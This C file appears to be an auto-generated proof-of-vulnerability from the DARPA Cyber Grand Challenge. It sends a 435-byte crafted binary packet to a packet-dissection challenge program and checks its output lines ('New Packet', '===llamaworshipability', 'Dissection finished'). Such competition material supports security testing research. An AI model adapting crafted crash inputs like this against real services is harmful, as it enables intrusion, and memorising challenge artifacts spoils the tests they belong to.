#include "libpov.h"
int main(int cgc_argc, char *cgc_argv[]) {
   cgc_negotiate_type1(0x0, 0x0, 0);
   do {
      //*** writing data
      static unsigned char write_00000_00000[] = 
         "\xb3\x01\x00\x00";
      static unsigned int write_00000_00000_len = 4;
      unsigned char *write_00000 = NULL;
      unsigned int write_00000_len = 0;
      write_00000 = cgc_append_buf(write_00000, &write_00000_len, write_00000_00000, write_00000_00000_len);
      if (write_00000_len > 0) {
         cgc_transmit_all(1, write_00000, write_00000_len);
      }
      cgc_free(write_00000);
   } while (0);
   do {
      //*** writing data
      static unsigned char write_00001_00000[] = 
         "\x01\x00\x00\x00\x00\x00\x00\x00\x9b\x01\x00\x00\x93\x01\x00\x00"
         "\x00\x00\x00\x00\x10\x01\x10\x10\x00\x00\x00\x00\x93\x01\x00\x00"
         "\x63\xba\xb8\x56\xc9\x32\x88\x96\x96\xfb\x53\xba\x2c\xce\xe9\xd2"
         "\x71\x55\xfb\xd3\x4e\x00\x00\x00\x01\x00\xa3\xc7\x84\xdd\xf2\x30"
         "\x5d\x9c\xb5\x58\x12\x8e\xf0\x1a\x95\x21\x57\x11\xd6\x84\x26\x83"
         "\x8e\x12\x2b\x01\xf9\x01\x00\x9d\x01\x00\xd4\x04\xa4\x56\x1f\x79"
         "\xd6\xf3\xd0\xcf\x0c\xb0\x41\x00\xfa\x31\xae\x73\x8e\x16\x6b\xc5"
         "\xf2\x9c\x27\xdd\xff\x86\x1b\xa3\xef\xdc\x0d\x94\xf7\x86\xa7\x1d"
         "\x54\xb0\xa1\xe9\x4a\xaa\x19\x83\xc7\xf0\x81\x68\x3c\x45\x3d\x4e"
         "\x4f\x3f\x14\x67\x53\x73\xfd\x33\x90\xed\xa3\xa9\xeb\x43\x61\xd2"
         "\x5b\xdf\xf6\xa7\xd4\x82\x81\x75\xe9\x4b\x3e\x96\x5e\x51\x4e\xab"
         "\xee\x60\x49\xe6\x22\x3f\xe7\x31\xd4\x8d\xf6\x2a\x74\xce\xb2\x2c"
         "\xdd\x54\xac\x62\x43\x04\xc5\xd6\x79\xc2\x20\xbd\x36\xdd\x66\xd2"
         "\xd3\x85\xc1\x2e\x4f\x35\x02\x5d\xe9\x19\x7b\x8e\xc8\x86\xc2\xbf"
         "\x3b\x5e\x78\xf2\x73\x33\x8e\x5b\xd9\x87\xed\xd2\x35\xea\x8d\x7b"
         "\xf1\xcb\xe2\xbc\x0b\x4e\xd7\x8c\xf4\xce\x4d\x16\x37\x63\xc0\x3e"
         "\x08\xde\x3b\xca\x8d\x0e\x1d\x3b\xca\xb9\xb1\xba\x5c\x32\x42\xef"
         "\x51\x8a\xb0\x27\x42\x52\xfa\x0e\x4f\xae\xc2\x69\xdc\x54\x74\x53"
         "\x67\x51\x54\xb9\x94\x14\xb2\xfa\x47\x37\xb8\x15\x86\x4f\x73\xc4"
         "\xcb\xff\x42\x01\xef\x2c\xa6\x55\x91\x2d\x6a\x5b\x81\x1a\x39\xe3"
         "\xda\x1b\xb2\xc4\xdb\xc3\x1e\xe7\x29\xe3\x09\xd3\xe4\x91\x7f\x5c"
         "\x5f\xbb\xa9\xf8\x05\x2b\xe5\x62\x4e\xce\x67\x7a\xdf\x48\x83\x6a"
         "\xd1\x29\xc0\x04\x99\xd2\xc2\x4f\xc0\x9e\x1b\x37\xf7\xc7\xe7\x1a"
         "\x79\x95\xce\xcb\x7e\x7d\x81\xc4\xc1\x89\x01\x31\xc6\x66\x2c\x90"
         "\x64\x57\xde\xb3\xe1\x60\x44\xde\xdb\x5e\x0c\x3e\x01\x00\x64\x01"
         "\x74\x09\x19\x01\xc4\x51\xfc\x22\x1d\x01\x00\xaf\x16\xb2\x01\x77"
         "\x41\x00\x0f\xa5\x3c\xe2\x03\x40\xa3\xb5\x4d\x3b\x9e\x26\x6e\x41"
         "\x00\xe9\x17";
      static unsigned int write_00001_00000_len = 435;
      unsigned char *write_00001 = NULL;
      unsigned int write_00001_len = 0;
      write_00001 = cgc_append_buf(write_00001, &write_00001_len, write_00001_00000, write_00001_00000_len);
      if (write_00001_len > 0) {
         cgc_transmit_all(1, write_00001, write_00001_len);
      }
      cgc_free(write_00001);
   } while (0);
   do {
      unsigned char *read_00000;
      unsigned int read_00000_len;
      unsigned int read_00000_ptr = 0;
      //**** delimited read
      static unsigned char read_00000_delim[] = 
         "\x0a";
      read_00000 = NULL;
      read_00000_len = 0;
      int read_00000_res = cgc_delimited_read(0, &read_00000, &read_00000_len, read_00000_delim, 1);
      if (read_00000_res) {} //silence unused variable warning
      //**** read match data
      static unsigned char match_00000_00000[] = 
         "\x53\x74\x61\x72\x74\x69\x6e\x67\x20\x64\x69\x73\x73\x65\x63\x74"
         "\x69\x6f\x6e\x2e\x2e\x2e";
      read_00000_ptr += cgc_data_match(read_00000 + read_00000_ptr, read_00000_len - read_00000_ptr, match_00000_00000, 22);
      cgc_free(read_00000);
      if (read_00000_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00001;
      unsigned int read_00001_len;
      unsigned int read_00001_ptr = 0;
      //**** delimited read
      static unsigned char read_00001_delim[] = 
         "\x3d\x3d\x3d\x3d\x0a";
      read_00001 = NULL;
      read_00001_len = 0;
      int read_00001_res = cgc_delimited_read(0, &read_00001, &read_00001_len, read_00001_delim, 5);
      if (read_00001_res) {} //silence unused variable warning
      /* read match pcre:
.*New Packet
*/
      static char read_00001_00000_regex[] = 
         "\x2e\x2a\x4e\x65\x77\x20\x50\x61\x63\x6b\x65\x74";
      static match_result read_00001_00000_match;
      pcre *read_00001_00000_pcre = cgc_init_regex(read_00001_00000_regex);
      if (read_00001_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00001_00000_pcre, 0, read_00001 + read_00001_ptr, read_00001_len - read_00001_ptr, &read_00001_00000_match);
         if (rc > 0) {
            read_00001_ptr += read_00001_00000_match.match_end - read_00001_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00001_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00001);
      if (read_00001_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00002;
      unsigned int read_00002_len;
      unsigned int read_00002_ptr = 0;
      //**** delimited read
      static unsigned char read_00002_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00002 = NULL;
      read_00002_len = 0;
      int read_00002_res = cgc_delimited_read(0, &read_00002, &read_00002_len, read_00002_delim, 4);
      if (read_00002_res) {} //silence unused variable warning
      /* read match pcre:
.*===llama
*/
      static char read_00002_00000_regex[] = 
         "\x2e\x2a\x3d\x3d\x3d\x6c\x6c\x61\x6d\x61";
      static match_result read_00002_00000_match;
      pcre *read_00002_00000_pcre = cgc_init_regex(read_00002_00000_regex);
      if (read_00002_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00002_00000_pcre, 0, read_00002 + read_00002_ptr, read_00002_len - read_00002_ptr, &read_00002_00000_match);
         if (rc > 0) {
            read_00002_ptr += read_00002_00000_match.match_end - read_00002_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00002_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00002);
      if (read_00002_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00003;
      unsigned int read_00003_len;
      unsigned int read_00003_ptr = 0;
      //**** delimited read
      static unsigned char read_00003_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00003 = NULL;
      read_00003_len = 0;
      int read_00003_res = cgc_delimited_read(0, &read_00003, &read_00003_len, read_00003_delim, 4);
      if (read_00003_res) {} //silence unused variable warning
      /* read match pcre:
.*===llamaworshipability
*/
      static char read_00003_00000_regex[] = 
         "\x2e\x2a\x3d\x3d\x3d\x6c\x6c\x61\x6d\x61\x77\x6f\x72\x73\x68\x69"
         "\x70\x61\x62\x69\x6c\x69\x74\x79";
      static match_result read_00003_00000_match;
      pcre *read_00003_00000_pcre = cgc_init_regex(read_00003_00000_regex);
      if (read_00003_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00003_00000_pcre, 0, read_00003 + read_00003_ptr, read_00003_len - read_00003_ptr, &read_00003_00000_match);
         if (rc > 0) {
            read_00003_ptr += read_00003_00000_match.match_end - read_00003_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00003_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00003);
      if (read_00003_ptr) {}  //silence unused variable warning if any
   } while (0);
   do {
      unsigned char *read_00004;
      unsigned int read_00004_len;
      unsigned int read_00004_ptr = 0;
      //**** delimited read
      static unsigned char read_00004_delim[] = 
         "\x3d\x3d\x3d\x0a";
      read_00004 = NULL;
      read_00004_len = 0;
      int read_00004_res = cgc_delimited_read(0, &read_00004, &read_00004_len, read_00004_delim, 4);
      if (read_00004_res) {} //silence unused variable warning
      /* read match pcre:
.*Dissection finished
*/
      static char read_00004_00000_regex[] = 
         "\x2e\x2a\x44\x69\x73\x73\x65\x63\x74\x69\x6f\x6e\x20\x66\x69\x6e"
         "\x69\x73\x68\x65\x64";
      static match_result read_00004_00000_match;
      pcre *read_00004_00000_pcre = cgc_init_regex(read_00004_00000_regex);
      if (read_00004_00000_pcre != NULL) {
         int rc = cgc_regex_match(read_00004_00000_pcre, 0, read_00004 + read_00004_ptr, read_00004_len - read_00004_ptr, &read_00004_00000_match);
         if (rc > 0) {
            read_00004_ptr += read_00004_00000_match.match_end - read_00004_00000_match.match_start;
         }
         else {
            //this is a pov so what does this even mean?
            //why would we quit on failed match, just keep sending stuff.
         }
         pcre_free(read_00004_00000_pcre);
      }
      else {
         //this is a pov so what does this even mean?
         //why would we quit on failed regex compile, just keep sending stuff.
      }
      cgc_free(read_00004);
      if (read_00004_ptr) {}  //silence unused variable warning if any
   } while (0);
}
